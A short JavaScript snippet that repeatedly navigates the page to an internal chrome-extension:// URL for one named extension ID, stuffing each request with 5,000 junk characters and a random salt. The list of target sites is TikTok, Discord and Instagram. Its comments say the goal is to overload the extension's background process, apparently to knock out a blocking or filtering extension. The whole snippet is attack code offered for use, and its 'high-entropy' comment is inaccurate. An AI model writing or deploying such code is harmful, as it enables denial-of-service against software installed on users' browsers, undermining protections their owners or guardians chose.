let i = 0;
const extensionId = "ckecmkbnoanpgplccmnoikfmpcdladkc";
const targets = ["tiktok.com", "discord.com", "instagram.com"];

function startRace() {
    const myWorker = new Worker('scripts/worker.js');
    myWorker.postMessage("start");

    myWorker.onmessage = function() {
        const domain = targets[i % targets.length];
        
        // 5,000 characters of high-entropy data
        const junk = "A1B2C3D4E5".repeat(500); 
        const salt = Math.random().toString(36).substring(2, 10);

        // --- DIRECT EXTENSION TARGETING ---
        // This targets an internal resource. Most extensions have 
        // to verify these requests, putting the CPU load directly 
        // on the extension's background process.
        const testUrl = `chrome-extension://${extensionId}/manifest.json?target=${domain}&data=${junk}&v=${salt}`;

        window.location.href = testUrl;

        i++;
    };
}
